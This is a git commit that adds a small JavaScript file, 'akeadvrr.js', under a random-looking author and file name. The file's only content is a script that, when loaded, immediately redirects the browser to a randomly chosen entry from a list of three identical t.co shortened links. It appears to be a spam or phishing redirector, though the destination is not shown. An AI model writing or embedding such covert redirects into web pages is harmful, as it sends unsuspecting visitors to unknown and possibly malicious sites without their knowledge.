e47d07586502f315a463e4c42fcf06e41cc7825a
idhoiphiy <idhoiphiy.o@gmail.com>
2026-04-29 22:38:19 +0700

    Create akeadvrr.js

---
+++ akeadvrr.js
@@ -0,0 +1,9 @@
+var dataUrl = [
+
+'https://t.co/32Yrxf7Q7h',
+'https://t.co/32Yrxf7Q7h',
+'https://t.co/32Yrxf7Q7h'
+
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
